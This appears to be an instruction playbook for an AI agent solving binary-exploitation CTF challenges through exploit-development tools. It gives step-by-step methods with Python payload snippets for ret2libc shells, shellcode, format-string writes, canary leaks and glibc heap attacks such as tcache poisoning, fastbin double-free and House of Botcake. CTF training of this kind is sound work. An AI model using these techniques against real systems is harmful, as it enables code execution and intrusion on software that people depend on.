## Stack layout (amd64, canary, GCC)

- **`sub rsp, IMM`** is total frame, not padding-to-canary. Distance from buffer to canary comes from `rbp`-relative addresses: e.g. canary at `[rbp-0x8]`, buffer at `[rbp-0x50]` → fill `0x48` bytes, then 8-byte canary, 8-byte saved RBP, then ROP.
- `gdb_find_offset` often hits `SIGABRT`/`__stack_chk_fail` on canary builds. Don't guess layout from `sub rsp` alone.
- Menu-driven binaries: `gdb_find_offset` is optional. Raw cyclic stdin may not reach the bug.
- Prompt sync: if program prints `name?\n`, use `recvuntil(b'name?\n')` — without `\n` may never match.
- Canary is consistent within one process; don't compare across GDB sessions.

## Technique Playbooks

### ret2win

1. Bootstrap/`checksec` → no canary, no PIE
2. `elf_symbols` → win function address
3. `gdb_find_offset` → offset to RIP
4. Payload: `b'A' * offset + p64(win_addr)`
5. If crash: add `ret` gadget before win_addr for alignment

### ret2libc (staged leak)

1. `checksec` → no canary, NX on. If PIE: leak PIE base via `pie_base_from_leak`.
2. `gdb_find_offset` for offset (single-shot targets), else derive from disassembly.
3. Gadgets: `rop_gadgets(binary_path)` with no search first.
4. **If no `system@plt` or `/bin/sh`** → two-stage leak:
   - Stage 1: `ret2libc_stage1_payload` — leak `puts@got` via `puts@plt`, return to `main`.
   - Parse leak: after stable marker (e.g. `recvuntil(b'bye\n')`), read 6 bytes, `u64(...ljust(8, b'\x00'))`.
   - `libc_base_from_leak` → resolve system + /bin/sh.
   - Stage 2: `ret2libc_stage2_payload` → `system("/bin/sh")` with `ret` alignment.
5. **If `system@plt` exists but no `/bin/sh`**: use `rop_write_string_and_call_payload` to stage `/bin/sh` into `.bss` via `gets`/`read`.
6. Validate shell: send `id`, collect with `recvrepeat(1.5)`, check for `uid=`.

### Static i386, no `/bin/sh`

1. Use `elf_symbols(..., symbol_type="objects")`, `gdb_vmmap`, or bootstrap runtime info to pick a writable `.bss`/RW target.
2. Search gadgets in this order:
   - `rop_gadgets(binary_path)` for the common pack
   - `rop_gadgets(search="mov")` and prefer memory-write gadgets like `mov byte ptr [edx], al ; ... ; ret` or `mov dword ptr [eax + off], edx ; ret`
   - `rop_gadgets(search="pop eax")`, `pop ebx`, `pop ecx`, `pop edx`, and `int 0x80`
3. If `/bin/sh` is missing, do not stall on symbol search. Stage the string into writable memory, then use `execve`.
4. If the overflow is through `argv[1]`, remember the first-stage payload cannot contain NUL bytes. Prefer null-free staging or multi-step chains.

### Shellcode (NX off)

1. `checksec` → NX false
2. `gdb_find_offset` → offset (often 136 for 128-byte buffer)
3. `shellcraft_generate` → use `exploit_lines` (asm); `exploit_lines_hex` as fallback
4. Layout: `shellcode + pad to offset + p64(buf_addr)` — shellcode at start, RIP = leaked `buf_addr`
5. Parse leak from `process()` output, not `gdb_run`
6. Validate: `recvrepeat` after sending `id`

### Format string — read (leaks)

- Loop `%{i}$p` to map stack slots. Triage (amd64 heuristic):
  - `0x55…`/`0x56…` → PIE binary mapping
  - `0x7fff…`/`0x7ffc…` → stack
  - `0x7f…` (non-stack) → libc/loader
- Multiplex: `%11$p%16$p%9$p` with delimiters when layout is stable.
- `%{i}$s` only when slot holds a valid readable pointer.
- Filtered `$`: use `fmtstr_payload(..., no_dollars=True)`.

### Format string — write

- Find offset: `AAAAAAAA%p.%p...` until you see `0x4141414141414141`.
- Target address: use printed address or `elf_symbols` .bss — **not** `elf_search` on variable names.
- `format_string_payload` with `write_size="byte"` for small values. Use `exploit_lines` verbatim.
- **Never** hand-edit `%n` specifiers or addresses.
- `printf(buf)` stops at first NUL → don't put `p64(addr)` before specifiers.
- `written`/`numbwritten`: bytes printed by **this same printf** before your format. Separate `printf("prefix"); printf(buf);` → `written=0`.

### Canary leak

- Fill buffer to canary with non-null bytes; if output echoes past buffer, leak canary (low byte often `0x00` on amd64).
- Reconstruct: `u64(recv(7).ljust(8, b'\x00'))` (adjust to match I/O).
- Then use `ret2libc_stage1_payload`/`ret2libc_stage2_payload` with `canary=`, `canary_offset=`.

### Heap (tcache poisoning / UAF)

Menu-driven: use `sendlineafter`/`recvuntil` helpers per prompt. Do **not** use one giant stdin blob.

```python
def alloc(i): p.sendlineafter(b'> ', b'1'); p.sendlineafter(b'index', str(i).encode())
def free(i):  p.sendlineafter(b'> ', b'2'); p.sendlineafter(b'index', str(i).encode())
def edit(i,d):p.sendlineafter(b'> ', b'3'); p.sendlineafter(b'index', str(i).encode()); p.send(d)
def show(i):  p.sendlineafter(b'> ', b'4'); p.sendlineafter(b'index', str(i).encode()); return p.recvuntil(b'\n1)', drop=False)
```

**Tcache (glibc 2.32+ safe-linking):**

- `encoded_fd = (chunk_user_ptr >> 12) ^ target_user_ptr` — do NOT write raw target.
- In the exploit script: compute inline as `encoded_fd = (chunk_user_ptr >> 12) ^ (fake_chunk_addr + 0x10)`.
  Call `heap_safe_link` MCP tool only to verify the formula on a known value; it cannot be imported in the exploit script.
- `unaligned tcache chunk detected` = wrong safe-linking math.
- UAF pattern: alloc A,B → free B,A → UAF edit A's fd → alloc twice → write target.
- Parse target pointers from banner text when available.
- Tcache only pops while `counts[i] > 0`; need ≥ N+1 frees before poisoning N-deep
  target, else count hits 0 before target is reached.

**Fastbin double-free (glibc 2.32+ safe-linking on fastbin fd too):**

Exact step-by-step (do not deviate):
1. **Fill tcache** — alloc slots 0-8 (9 chunks), then free 0-6 (7 frees): tcache[SZ] now full.
2. **Fastbin frees** — free slot 7, free slot 8: both go to fastbin (tcache full).
3. **A→B→A** — free slot 7 again (head=slot8 ≠ slot7 → passes): fastbin = [7→8→7].
4. **Drain tcache** — alloc 7 times (slots 9-15): tcache[SZ] now empty.
5. **Pop fastbin:** `a_ptr = alloc(16)` → chunk 7 (A, fastbin head); `b_ptr = alloc(17)` → chunk 8 (B).
   Fastbin is LIFO — last freed (slot 7, second time) is head. alloc 16 = chunk7 (A), alloc 17 = chunk8 (B).
6. **Compute encoded fd in Python** (chunk addresses are ASLR, cannot be pre-computed):
   ```python
   target_user_ptr = fake_chunk_addr + 0x10  # +0x10 is MANDATORY; malloc returns user ptr, not header
   encoded_fd = (a_ptr >> 12) ^ target_user_ptr
   ```
7. **Edit slot 16** (which holds chunk 7 / A) — write `p64(encoded_fd).ljust(0x28, b'\x00')`.
   This overwrites the phantom copy of A still in the fastbin.
8. **Two allocs to reach fake chunk:**
   - `alloc(18)` → phantom A (chunk 7 again); fastbin head decodes to `target_user_ptr`.
   - `alloc(19)` → `fake_chunk_addr + 0x10` (the fake chunk user ptr). **Only TWO allocs, not three.**
9. `edit(19, ...)` writes to `fake_chunk + 0x10` → satisfies any win condition at offset 16 of the chunk.

Key invariants:
- Fastbin fd stores USER pointer (not chunk header) in glibc 2.32+.
- Global fake chunk needs valid size field matching the fastbin class (e.g. `0x31` for 0x20-byte allocs).
- `malloc` returns user pointer = `fake_chunk_addr + 0x10`; using `fake_chunk_addr` or `fake_chunk_addr+8` as target will corrupt heap or return wrong address.

**House of Botcake (tcache double-free bypass via unsorted-bin KEY overwrite):**

Exact step-by-step (do not deviate):

1. **Pick SZ** — a user size whose chunk size lands in unsorted bin when tcache is full (e.g. SZ=0xf0 → 0x100 chunk). CHUNK_SZ = SZ + 0x10.
2. **Alloc helper MUST return chunk address** — read the `chunk at %p` output every time. **Edit helper MUST use `send`/`sendafter`, never `sendlineafter`** — `read()` in the binary wants an exact byte count; appending `\n` causes it to block and consume subsequent menu input as heap data:
   ```python
   def alloc(idx, size):
       p.sendlineafter(b'> ', b'1')
       p.sendlineafter(b'index', str(idx).encode())
       p.sendlineafter(b'size', str(size).encode())
       p.recvuntil(b'chunk at ')
       return int(p.recvuntil(b'\n').strip(), 16)

   def edit(idx, data):
       p.sendlineafter(b'> ', b'3')
       p.sendlineafter(b'index', str(idx).encode())
       p.sendafter(b'data: ', data)   # sendafter not sendlineafter
   ```
3. **Alloc 10 chunks** — indices 0-6 (tcache fill), 7=PP, 8=P, 9=GUARD. GUARD (chunk 9) MUST be allocated **after P** and never freed — without it, glibc absorbs the consolidated PP+P block into the top chunk, destroying the setup.
   ```python
   chunks = {}
   for i in range(10):
       chunks[i] = alloc(i, SZ)
   pp_addr = chunks[7]; p_addr = chunks[8]
   ```
4. **Fill tcache** — free indices 0-6: tcache[CHUNK_SZ] = 7 (full).
5. **Free P (idx 8)** → goes to unsorted bin (tcache full); glibc overwrites P's KEY field with a libc pointer.
6. **Free PP (idx 7)** → forward-coalesces PP+P into a single 0x200 chunk in unsorted bin.
7. **Drain one tcache slot** — `alloc(10, SZ)`: tcache count 7→6, making room for P.
8. **Free P again (idx 8)** — glibc checks KEY: sees libc ptr ≠ tcache_key → passes → P lands in tcache.
9. **Alloc overlap** — `alloc(11, SZ*2)`: malloc serves the merged unsorted-bin chunk, returning pp_addr. The overlap spans PP+P.
10. **Poison P's fd** — P's user area is at offset CHUNK_SZ inside the overlap:
    ```python
    encoded_fd = (p_addr >> 12) ^ target_addr
    edit(11, b'\x00' * CHUNK_SZ + p64(encoded_fd))
    ```
11. **Two allocs reach target**:
    - `alloc(12, SZ)` → pops P from tcache; tcache head = target_addr
    - `alloc(13, SZ)` → returns target_addr

Key invariants:
- `do_edit` is blocked on freed chunks (freed_flag check) → you cannot directly UAF-edit P's fd. You MUST use the overlap chunk (step 9-10).
- Guard chunk (idx 9) is mandatory. No guard = top-chunk absorption = second free(P) corrupts heap.
- Do NOT drain tcache by re-freeing — that trips the tcache double-free check. Use alloc.

**Heap overflow → tcache poison:**

Exact step-by-step (do not deviate):

1. **Alloc A, B, dummy** — three same-size chunks. A is the overflow source; B is the victim (will be freed into tcache); dummy is a throw-away chunk needed to get count to 2.
   ```python
   chunk_a = alloc(0)   # overflow source
   chunk_b = alloc(1)   # victim
   dummy   = alloc(2)   # needed for tcache count
   ```
2. **Free dummy first → count=1. Free B → count=2.** CRITICAL: tcache count must be 2 before you overflow. After you pop B (count→1) and then pop the poisoned target (count→0) the exploit reaches the target. If you only free B (count=1), popping B drops count to 0 and the next alloc calls `malloc()` directly — you never reach the target.
   ```python
   free(2)   # dummy → tcache count = 1
   free(1)   # B     → tcache count = 2
   ```
3. **Compute encoded fd** — B's key is its user pointer (same safe-link formula):
   ```python
   encoded_fd = (chunk_b >> 12) ^ target_addr
   ```
4. **Overflow from A into B's freed header** — the layout is:
   - bytes 0 … USERSZ-1: fill chunk A user area
   - bytes USERSZ … USERSZ+7: B's `prev_size` (write `p64(0)`)
   - bytes USERSZ+8 … USERSZ+15: B's `size` field (write `p64(CHUNK_SZ | 1)`, preserve PREV_INUSE)
   - bytes USERSZ+16 … USERSZ+23: B's `fd` (write `p64(encoded_fd)`)
   ```python
   payload = b'\x00' * USERSZ + p64(0) + p64(CHUNK_SZ | 1) + p64(encoded_fd)
   edit(0, payload)   # sendafter — do NOT use sendlineafter
   ```
5. **Two allocs reach target**:
   - `alloc(3)` → pops B from tcache (count→1); tcache head = target_addr
   - `alloc(4)` → pops target_addr (count→0)
6. `edit(4, ...)` writes to target.

## GDB / dynamic analysis

Use `gdb_run`, `gdb_breakpoint`, `gdb_stack`, `gdb_vmmap`, `gdb_examine` for layout/state.

- Menu-driven: default to `gdb_breakpoint` over `gdb_run`.
- Only use `gdb_find_offset` after proving input reaches the vulnerable read.
- `vmmap` / `info proc mappings` for R/W/X per segment.

## Mitigations quick ref

| Mitigation | Impact |
|---|---|
| Full RELRO | GOT read-only after relocation |
| PIE | Code addresses slide — need leak |
| NX | Stack not executable → ROP/ret2libc |
| Canary | Leak or avoid smashing past it |

## Misc tricks

- **`rand` prediction:** match `srand(time(NULL))` with ctypes in sync with `process()` start.
- **`__malloc_hook`/`__free_hook`:** removed in glibc ≈ 2.34+; version-specific.
- **Stack alignment (x86_64):** extra `ret` gadget fixes movaps/segfault before `system`/`puts`.

## Bootstrap usage

Reuse bootstrap for first-pass recon. Re-run tools only when you need more detail. Avoid broad `strings_search(interesting_only=false)` as an opening move on static binaries.
